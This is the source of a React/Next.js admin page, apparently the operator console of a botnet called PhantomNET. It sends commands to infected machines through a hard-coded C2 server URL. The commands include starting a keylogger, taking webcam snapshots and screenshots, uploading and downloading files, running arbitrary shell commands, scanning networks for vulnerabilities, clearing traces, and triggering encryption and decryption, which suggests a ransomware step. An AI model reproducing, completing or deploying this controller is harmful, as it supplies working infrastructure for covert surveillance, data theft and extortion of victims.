import { useEffect, useState } from "react";
import axios from "axios";
import { useSelector } from "react-redux";
import { RootState } from "../../../../store";
import { useRouter } from "next/router";
import { useSession } from "next-auth/react";

const C2_URL = "https://192.168.0.22:5000"; // Replace with your C2 server URL

export default function Home() {
  const { db_link } = useSelector((state: RootState) => state.apiData);
  const { data: session } = useSession();
  const router = useRouter();
  const [isLoading, setIsLoading] = useState(false);
  const [isFetching, setIsFetching] = useState(true);
  const [commands, setCommands] = useState([]);
  const [botId, setBotId] = useState("");
  const [selectedCommand, setSelectedCommand] = useState("");
  const [customCommand, setCustomCommand] = useState("");
  const [filePath, setFilePath] = useState("");
  const [response, setResponse] = useState("");
  const scanNetwork = async () => {
    try {
      const res = await axios.get(`${C2_URL}/scan_network`);
      setResponse(
        `File Saved ${res.data.file} - ${res.data.status}` ||
          "[No result returned]"
      );
    } catch (err: any) {
      setResponse(`[!] Failed to send: ${err.message}`);
    }
  };
  const vuln_scan = async () => {
    try {
      const res = await axios.get(`${C2_URL}/vuln_scan/${botId}`);
      setResponse(
        `File Saved ${res.data.file} - ${res.data.status}` ||
          "[No result returned]"
      );
    } catch (err: any) {
      setResponse(`[!] Failed to send: ${err.message}`);
    }
  };
  const handleSend = async () => {
    //delete the previous response
    setIsLoading(true);
    let commandToSend = "";

    switch (selectedCommand) {
      case "custom":
        commandToSend = customCommand;
        break;
      case "upload":
        commandToSend = `upload ${filePath}`;
        break;
      case "download":
        commandToSend = `download ${filePath}`;
        break;
      case "sysinfo":
        commandToSend = "sysinfo";
        break;
      case "keylogger_start":
        commandToSend = "keylogger start";
        break;
      case "keylogger_stop":
        commandToSend = "keylogger stop";
        break;
      case "webcam":
        commandToSend = "webcam snap";
        break;
      case "screenshot":
        commandToSend = "screenshot snap";
        break;
      case "scan_network":
        scanNetwork();
        break;
      case "clear_trace":
        commandToSend = "clear_trace";
        break;
      case "vuln_scan":
        vuln_scan();
        break;
      case "trigger_encryption":
        commandToSend = "encrypt";
        break;
      case "trigger_decryption":
        commandToSend = "decrypt";
        break;
      case "uninstall":
        commandToSend = "uninstall";
      default:
        return;
    }

    try {
      const sendRes = await axios.post(`${C2_URL}/send_command`, {
        bot_id: botId,
        command: commandToSend,
      });

      if (sendRes.status === 200) {
        // Add a 9-second delay after getting the result
        await new Promise((resolve) => setTimeout(resolve, 9000));
        // Fetch the result after the delay
        const resultRes = await axios.get(`${C2_URL}/get_result/${botId}`);
        setResponse(resultRes.data.result || "[No result returned]");
        setIsLoading(false);
      } else {
        setResponse(`[!] Failed to send command.`);
        setIsLoading(false);
      }
    } catch (error: any) {
      setIsLoading(false);
      setResponse(`[!] Error: ${error.message}`);
    }
  };
  useEffect(() => {
    if (db_link === "") return;
    setIsFetching(true);
    const url = `${db_link}/api/commands`;
    axios
      .get(url, {
        headers: {
          Authorization: `Bearer ${session?.user.token}`,
        },
      })
      .then((res) => {
        setCommands(res.data);
        setIsFetching(false);
      })
      .catch(() => {
        router.push("/");
      });
  }, [db_link]);
  if (isFetching) {
    return (
      <main className="flex flex-col items-center justify-center min-h-screen bg-gray-100 dark:bg-zinc-900">
        <div className="relative mb-4">
          <div className="h-20 w-20 rounded-full border-4 border-t-blue-500 border-b-blue-700 border-l-blue-600 border-r-blue-400 animate-spin"></div>
          <div className="absolute top-0 left-0 h-20 w-20 rounded-full border-4 border-blue-500 opacity-20"></div>
        </div>
        <div className="animate-pulse text-lg font-semibold text-gray-700 dark:text-gray-300">
          Loading
          <span className="animate-pulse">...</span>
        </div>
      </main>
    );
  } else {
    return (
      <main className="max-w-3xl my-12 mx-auto p-8 rounded-3xl shadow-lg border border-gray-200 dark:border-gray-800 bg-white dark:bg-zinc-900">
        <div className="flex items-center justify-between mb-8">
          <h1 className="text-3xl font-bold text-gray-900 dark:text-white flex items-center gap-3">
            <span className="inline-block w-2 h-6 bg-indigo-600 rounded-md"></span>
            PhantomNET
            <span className="text-indigo-600">Controller</span>
          </h1>
          <div className="px-3 py-1 text-xs rounded-full bg-indigo-100 dark:bg-indigo-900 text-indigo-700 dark:text-indigo-300">
            Admin Panel
          </div>
        </div>

        <div className="space-y-6">
          <div className="mb-6">
            <label className="block font-medium mb-2 text-gray-800 dark:text-gray-200">
              Bot ID (IP Address)
            </label>
            <div className="relative">
              <input
                type="text"
                defaultValue={"192.168."}
                onChange={(e) => setBotId(e.target.value)}
                className="w-full px-4 py-3 border-2 rounded-xl bg-white dark:bg-zinc-800 text-gray-900 dark:text-white border-gray-200 dark:border-gray-700 focus:border-indigo-500 focus:ring-1 focus:ring-indigo-500 outline-none transition-all"
                placeholder="192.168.1.5"
              />
              <div className="absolute right-3 top-3 text-gray-400">
                <svg
                  xmlns="http://www.w3.org/2000/svg"
                  width="20"
                  height="20"
                  viewBox="0 0 24 24"
                  fill="none"
                  stroke="currentColor"
                  strokeWidth="2"
                  strokeLinecap="round"
                  strokeLinejoin="round"
                >
                  <rect x="2" y="2" width="20" height="8" rx="2" ry="2"></rect>
                  <rect x="2" y="14" width="20" height="8" rx="2" ry="2"></rect>
                  <line x1="6" y1="6" x2="6" y2="6"></line>
                  <line x1="6" y1="18" x2="6" y2="18"></line>
                </svg>
              </div>
            </div>
          </div>

          <div className="mb-6">
            <label className="block font-medium mb-2 text-gray-800 dark:text-gray-200">
              Select Command
            </label>
            <div className="relative">
              <select
                className="w-full px-4 py-3 border-2 rounded-xl appearance-none bg-white dark:bg-zinc-800 text-gray-900 dark:text-white border-gray-200 dark:border-gray-700 focus:border-indigo-500 focus:ring-1 focus:ring-indigo-500 outline-none transition-all"
                value={selectedCommand}
                onChange={(e) => setSelectedCommand(e.target.value)}
              >
                <option value="">-- Choose a Command --</option>
                {commands.map((cmd: any) => (
                  <option key={cmd.id} value={cmd.code}>
                    {cmd.code}
                  </option>
                ))}
              </select>
              <div className="absolute right-3 top-3 text-gray-400 pointer-events-none">
                <svg
                  xmlns="http://www.w3.org/2000/svg"
                  width="20"
                  height="20"
                  viewBox="0 0 24 24"
                  fill="none"
                  stroke="currentColor"
                  strokeWidth="2"
                  strokeLinecap="round"
                  strokeLinejoin="round"
                >
                  <polyline points="6 9 12 15 18 9"></polyline>
                </svg>
              </div>
            </div>
          </div>

          {(selectedCommand === "custom" ||
            selectedCommand === "upload" ||
            selectedCommand === "download") && (
            <div className="mb-6">
              <label className="block font-medium mb-2 text-gray-800 dark:text-gray-200">
                {selectedCommand === "custom" ? "Custom Command" : "File Path"}
              </label>
              <input
                type="text"
                className="w-full px-4 py-3 border-2 rounded-xl bg-white dark:bg-zinc-800 text-gray-900 dark:text-white border-gray-200 dark:border-gray-700 focus:border-indigo-500 focus:ring-1 focus:ring-indigo-500 outline-none transition-all"
                value={selectedCommand === "custom" ? customCommand : filePath}
                onChange={(e) =>
                  selectedCommand === "custom"
                    ? setCustomCommand(e.target.value)
                    : setFilePath(e.target.value)
                }
                placeholder={
                  selectedCommand === "custom"
                    ? "e.g., whoami"
                    : "/path/to/file"
                }
              />
            </div>
          )}

          <button
            onClick={handleSend}
            className="w-full bg-indigo-600 hover:bg-indigo-700 text-white px-6 py-3 rounded-xl font-medium transition-colors flex items-center justify-center gap-2"
            disabled={!botId || !selectedCommand}
          >
            <svg
              xmlns="http://www.w3.org/2000/svg"
              width="18"
              height="18"
              viewBox="0 0 24 24"
              fill="none"
              stroke="currentColor"
              strokeWidth="2"
              strokeLinecap="round"
              strokeLinejoin="round"
            >
              <line x1="22" y1="2" x2="11" y2="13"></line>
              <polygon points="22 2 15 22 11 13 2 9 22 2"></polygon>
            </svg>
            Send Command
          </button>

          {isLoading && (
            <div className="mt-4 text-gray-700 dark:text-gray-300 flex items-center justify-center gap-3 p-3 bg-gray-50 dark:bg-zinc-800 rounded-xl">
              <div className="w-5 h-5 border-2 border-indigo-600 border-t-transparent rounded-full animate-spin"></div>
              <span>Sending command...</span>
            </div>
          )}

          {response && (
            <div className="mt-8 p-6 bg-gray-50 dark:bg-zinc-800 rounded-xl border border-gray-200 dark:border-gray-700">
              <h3 className="font-bold text-gray-800 dark:text-gray-200 mb-3 flex items-center gap-2">
                <svg
                  xmlns="http://www.w3.org/2000/svg"
                  width="18"
                  height="18"
                  viewBox="0 0 24 24"
                  fill="none"
                  stroke="currentColor"
                  strokeWidth="2"
                  strokeLinecap="round"
                  strokeLinejoin="round"
                >
                  <polyline points="4 17 10 11 4 5"></polyline>
                  <line x1="12" y1="19" x2="20" y2="19"></line>
                </svg>
                Response:
              </h3>
              <div className="mt-3 p-4 bg-gray-100 dark:bg-zinc-950/50 rounded-lg overflow-x-auto">
                <pre className="whitespace-pre-wrap text-sm text-gray-800 dark:text-gray-100 font-mono">
                  {response}
                </pre>
              </div>
            </div>
          )}
        </div>
      </main>
    );
  }
}
